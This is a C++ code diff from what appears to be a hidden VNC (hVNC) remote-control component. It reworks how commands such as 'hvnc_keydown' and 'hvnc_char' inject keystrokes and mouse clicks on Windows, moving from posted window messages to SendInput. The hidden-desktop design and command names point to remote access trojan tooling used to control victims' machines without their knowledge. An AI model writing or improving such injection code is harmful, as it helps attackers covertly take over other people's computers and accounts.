@@ -784,6 +784,37 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
+static bool send_key_input(WORD vk, bool keyUp) {
+    INPUT input{};
+    input.type = INPUT_KEYBOARD;
+    input.ki.wVk = vk;
+    input.ki.wScan = (WORD)MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    input.ki.dwFlags = (keyUp ? KEYEVENTF_KEYUP : 0);
+
+    // Standard extended keys
+    if (vk == VK_RMENU || vk == VK_RCONTROL || vk == VK_INSERT || vk == VK_DELETE ||
+        vk == VK_HOME || vk == VK_END || vk == VK_PRIOR || vk == VK_NEXT ||
+        vk == VK_LEFT || vk == VK_UP || vk == VK_RIGHT || vk == VK_DOWN ||
+        vk == VK_DIVIDE || vk == VK_NUMLOCK) {
+        input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
+    }
+
+    return SendInput(1, &input, sizeof(INPUT)) == 1;
+}
+
+static bool send_unicode_input(WORD ch) {
+    INPUT inputs[2] = {};
+    inputs[0].type = INPUT_KEYBOARD;
+    inputs[0].ki.wScan = ch;
+    inputs[0].ki.dwFlags = KEYEVENTF_UNICODE;
+
+    inputs[1].type = INPUT_KEYBOARD;
+    inputs[1].ki.wScan = ch;
+    inputs[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
+
+    return SendInput(2, inputs, sizeof(INPUT)) == 2;
+}
+
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
@@ -956,17 +987,13 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = WindowFromPoint(g_lastMousePos);
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
-            if (!hTarget || !IsWindow(hTarget)) continue;
 
-            if (action == "hvnc_keydown") {
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-            } else if (action == "hvnc_keyup") {
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-            } else if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+            if (action == "hvnc_char") {
+                send_unicode_input((WORD)vk);
+            } else {
+                send_key_input((WORD)vk, action == "hvnc_keyup");
             }
+
             g_forceFullFrame = true;
             continue;
         }
@@ -1086,14 +1113,8 @@ static void input_loop() {
                 g_hCurrentFocus = hwnd;
                 g_mouseDownTarget[btn] = hwnd;
 
-                POINT clientPt = screenPt;
-                ScreenToClient(hwnd, &clientPt);
-                LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
-
                 SetCursorPos(screenPt.x, screenPt.y);
-                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
-                PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
-                PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
+                send_mouse_input(normX, normY, mouse_button_flag(btn, true));
             }
             continue;
         }
@@ -1110,24 +1131,8 @@ static void input_loop() {
                 continue;
             }
 
-            HWND hwnd = g_mouseDownTarget[btn];
-            if (!hwnd || !IsWindow(hwnd)) hwnd = target_window_from_screen_point(screenPt);
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
-
-            if (hwnd) {
-                LRESULT ht = HTCLIENT;
-                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
-
-                UINT mouseMsg = mouse_message_for_button(btn, false);
-                POINT clientPt = screenPt;
-                ScreenToClient(hwnd, &clientPt);
-
-                SetCursorPos(screenPt.x, screenPt.y);
-                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
-                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
-                PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), MAKELPARAM(clientPt.x, clientPt.y));
-            }
+            SetCursorPos(screenPt.x, screenPt.y);
+            send_mouse_input(normX, normY, mouse_button_flag(btn, false));
             g_mouseDownTarget[btn] = NULL;
             continue;
         }
@@ -1146,24 +1151,13 @@ static void input_loop() {
                                     SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
                 UINT downMsg = mouse_message_for_button(btn, true);
-                UINT upMsg   = mouse_message_for_button(btn, false);
-                UINT dblMsg  = mouse_message_for_button(btn, true, btn == 0);
-
                 activate_target_window(hwnd, downMsg, ht);
 
-                POINT clientPt = screenPt;
-                ScreenToClient(hwnd, &clientPt);
-                LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
-                WPARAM downWParam = mouse_wparam_for_button(btn, true);
-                WPARAM upWParam   = mouse_wparam_for_button(btn, false);
-
                 SetCursorPos(screenPt.x, screenPt.y);
-                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, downMsg));
-                PostMessageW(hwnd, WM_MOUSEMOVE, downWParam, lParam);
-                PostMessageW(hwnd, downMsg, downWParam, lParam);
-                PostMessageW(hwnd, upMsg, upWParam, lParam);
-                PostMessageW(hwnd, dblMsg, downWParam, lParam);
-                PostMessageW(hwnd, upMsg, upWParam, lParam);
+                send_mouse_input(normX, normY, mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, mouse_button_flag(btn, false));
+                send_mouse_input(normX, normY, mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, mouse_button_flag(btn, false));
             }
             continue;
         }
